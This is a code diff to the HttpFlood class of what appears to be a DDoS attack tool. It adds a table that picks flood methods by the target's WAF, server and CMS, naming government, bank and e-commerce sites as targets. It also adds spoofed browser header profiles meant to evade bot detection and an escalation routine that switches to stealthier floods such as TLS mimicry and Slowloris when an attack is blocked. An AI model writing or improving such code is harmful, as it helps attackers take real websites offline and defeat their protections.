@@ -1747,12 +1747,16 @@ class HttpFlood(Thread):
             # StealthClient will use tls_client internally
             session = StealthClient.create_session(proxy_url)
             
-            headers = {
-                "User-Agent": randchoice(self._useragents),
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-                "Accept-Encoding": "gzip, deflate, br",
-                "Connection": "keep-alive",
-            }
+            # Use complete browser profile for maximum authenticity
+            if hasattr(self, '_BROWSER_PROFILES') and self._BROWSER_PROFILES:
+                headers = self._chaos_get_browser_profile()
+            else:
+                headers = {
+                    "User-Agent": randchoice(self._useragents),
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                    "Accept-Encoding": "gzip, deflate, br",
+                }
+            headers["Connection"] = "keep-alive"
             if hasattr(self, '_cf_clearance') and self._cf_clearance:
                 headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
                 
@@ -2607,6 +2611,54 @@ class HttpFlood(Thread):
         ("none", "apache", "joomla"):         {"POST_DYN": 50, "DYN": 45, "STRESS": 30},
         # Drupal targets
         ("none", "apache", "drupal"):         {"POST_DYN": 50, "DYN": 40, "POST": 35},
+        # ===== REAL-WORLD SCENARIOS LEARNED FROM FIELD EXPERIENCE =====
+        # --- Government / Institution sites (usually Apache + no WAF + old CMS) ---
+        ("none", "apache", "custom"):         {"SLOW_V2": 45, "STRESS": 40, "POST_DYN": 35, "PPS": 30},
+        ("none", "unknown", "custom"):        {"STRESS": 40, "POST_DYN": 35, "PPS": 30, "GET": 30},
+        # --- E-commerce heavy (Magento/OpenCart on Nginx/LiteSpeed) ---
+        ("none", "nginx", "custom"):          {"POST_DYN": 50, "DYN": 45, "STRESS": 35, "PPS": 30},
+        ("none", "litespeed", "custom"):      {"POST_DYN": 45, "DYN": 40, "STRESS": 30},
+        # --- CloudFlare Free Tier (most common protection) ---
+        ("cloudflare", "unknown", "custom"):  {"STEALTH_JA3": 75, "SLOW_V2": 35, "POST_DYN": 25, "BOT": 15},
+        ("cloudflare", "unknown", "wordpress"):{"STEALTH_JA3": 70, "WP_SEARCH": 55, "XMLRPC_AMP": 45, "SLOW_V2": 20},
+        ("cloudflare", "litespeed", "wordpress"):{"STEALTH_JA3": 70, "WP_SEARCH": 60, "POST_DYN": 30},
+        ("cloudflare", "cloudflare", "custom"):{"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 20},
+        # --- Sucuri + WordPress (very common combo for mid-size sites) ---
+        ("sucuri", "apache", "wordpress"):    {"STEALTH_JA3": 55, "WP_SEARCH": 65, "XMLRPC_AMP": 60, "DYN": 25},
+        ("sucuri", "nginx", "wordpress"):     {"STEALTH_JA3": 50, "WP_SEARCH": 60, "XMLRPC_AMP": 55, "POST_DYN": 30},
+        ("sucuri", "unknown", "wordpress"):   {"STEALTH_JA3": 50, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
+        ("sucuri", "apache", "custom"):       {"STEALTH_JA3": 50, "POST_DYN": 35, "DYN": 30},
+        ("sucuri", "nginx", "custom"):        {"STEALTH_JA3": 50, "POST_DYN": 35, "DYN": 30},
+        # --- Imperva / Incapsula (enterprise sites, banks, large e-commerce) ---
+        ("imperva", "nginx", "custom"):       {"STEALTH_JA3": 65, "COOKIE": 35, "SLOW_V2": 30, "POST_DYN": 20},
+        ("imperva", "apache", "custom"):      {"STEALTH_JA3": 60, "COOKIE": 35, "SLOW_V2": 25},
+        ("imperva", "unknown", "custom"):     {"STEALTH_JA3": 65, "COOKIE": 30, "SLOW_V2": 25},
+        # --- DDoS-Guard (Russian sites, gaming, crypto) ---
+        ("ddosguard", "nginx", "custom"):     {"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 15},
+        ("ddosguard", "unknown", "custom"):   {"STEALTH_JA3": 75, "SLOW_V2": 35},
+        # --- Fastly CDN (media sites, SaaS platforms) ---
+        ("fastly", "nginx", "custom"):        {"STEALTH_JA3": 65, "POST_DYN": 30, "DYN": 25},
+        ("fastly", "unknown", "custom"):      {"STEALTH_JA3": 60, "POST_DYN": 30},
+        # --- AWS WAF (SaaS, startups, API backends) ---
+        ("aws_waf", "nginx", "custom"):       {"STEALTH_JA3": 70, "POST_DYN": 35, "DYN": 25, "COOKIE": 15},
+        ("aws_waf", "unknown", "custom"):     {"STEALTH_JA3": 65, "POST_DYN": 30, "COOKIE": 20},
+        ("aws_waf", "nginx", "laravel"):      {"STEALTH_JA3": 65, "POST_DYN": 50, "POST": 35},
+        ("aws_waf", "nginx", "nextjs"):       {"STEALTH_JA3": 70, "POST_DYN": 40, "DYN": 30},
+        # --- StackPath (smaller CDN, hosting providers) ---
+        ("stackpath", "nginx", "custom"):     {"STEALTH_JA3": 60, "POST_DYN": 35, "SLOW_V2": 25},
+        ("stackpath", "apache", "wordpress"): {"STEALTH_JA3": 55, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
+        # --- Wordfence + Cloudflare Double Protection ---
+        ("cloudflare", "nginx", "wordpress"): {"STEALTH_JA3": 80, "WP_SEARCH": 60, "XMLRPC_AMP": 50},
+        # --- IIS Servers (Corporate / Government / Legacy .NET Apps) ---
+        ("none", "iis", "custom"):            {"SLOW_V2": 55, "STRESS": 45, "POST_DYN": 35, "PPS": 25},
+        ("aws_waf", "iis", "custom"):         {"STEALTH_JA3": 60, "SLOW_V2": 40, "POST_DYN": 30},
+        # --- OpenResty (API Gateways, Kong, custom Lua WAFs) ---
+        ("none", "openresty", "custom"):      {"POST_DYN": 45, "DYN": 40, "STRESS": 30, "SLOW_V2": 25},
+        ("cloudflare", "openresty", "custom"):{"STEALTH_JA3": 70, "POST_DYN": 30, "SLOW_V2": 25},
+        # --- NextJS / React SSR (Modern web apps, Vercel) ---
+        ("none", "nginx", "nextjs"):          {"POST_DYN": 50, "DYN": 40, "POST": 35, "STRESS": 25},
+        ("cloudflare", "nginx", "nextjs"):    {"STEALTH_JA3": 65, "POST_DYN": 35, "DYN": 25},
+        ("none", "unknown", "nextjs"):        {"POST_DYN": 45, "DYN": 40, "POST": 30},
     }
     
     # ========================================================================
@@ -2734,6 +2786,85 @@ class HttpFlood(Thread):
             intel["temperature"] = min(intel["temperature"] + 0.1, 0.8)
             
         return intel["wave_state"]
+
+    # ========================================================================
+    #  BROWSER PROFILE DATABASE: Complete header sets for different browsers
+    #  WAFs correlate User-Agent with header order and values
+    #  Using mismatched headers is an instant bot detection signal
+    # ========================================================================
+    _BROWSER_PROFILES = [
+        {   # Chrome 130 Windows
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+            "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+            "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"',
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
+        },
+        {   # Chrome 130 macOS
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+            "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+            "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"macOS"',
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
+        },
+        {   # Firefox 131 Windows
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
+        },
+        {   # Firefox 131 Linux
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
+        },
+        {   # Safari 17 macOS
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
+        },
+        {   # Edge 130 Windows
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
+            "Sec-Ch-Ua": '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
+            "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"',
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
+        },
+        {   # Chrome Mobile Android
+            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36",
+            "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+            "Sec-Ch-Ua-Mobile": "?1", "Sec-Ch-Ua-Platform": '"Android"',
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
+        },
+    ]
+    
+    def _chaos_get_browser_profile(self):
+        """Select a random complete browser profile for header consistency."""
+        return dict(randchoice(self._BROWSER_PROFILES))
+    
+    def _chaos_retry_escalate(self, failed_method_name, method_map):
+        """If method A fails, try a stronger/different variant automatically."""
+        # Escalation chains: method -> fallback method
+        escalation = {
+            "GET": "DYN",           # Static GET failed -> Dynamic path GET
+            "POST": "POST_DYN",     # Static POST -> Dynamic payload POST
+            "STRESS": "SLOW_V2",    # Noisy stress blocked -> Go low and slow
+            "PPS": "DYN",           # Raw packets blocked -> Dynamic headers
+            "DYN": "STEALTH_JA3",   # Dynamic blocked -> Full TLS mimicry
+            "POST_DYN": "STEALTH_JA3",
+            "BOT": "STEALTH_JA3",
+            "COOKIE": "STEALTH_JA3",
+            "STEALTH_JA3": "SLOW_V2",  # Even stealth blocked -> Slowloris
+            "SLOW_V2": "COOKIE",       # Slowloris blocked -> Cookie flood
+        }
+        fallback = escalation.get(failed_method_name)
+        if fallback and fallback in method_map:
+            try:
+                method_map[fallback]()
+                return True
+            except Exception:
+                pass
+        return False
 
     def _chaos_health_pulse(self):
         """Periodic health check: re-probe target to detect weakening or death."""
@@ -3443,6 +3574,9 @@ class HttpFlood(Thread):
             # Phase 5: ADAPT with reinforcement learning
             if got_blocked or got_errors:
                 self._chaos_learn(chosen_name, False, got_5xx)
+                # Phase 6: RETRY ESCALATION - If method failed, try stronger variant
+                if got_blocked and intel["phase"] in ("ASSAULT", "FINISH"):
+                    self._chaos_retry_escalate(chosen_name, method_map)
             else:
                 self._chaos_learn(chosen_name, True, got_5xx)
                 
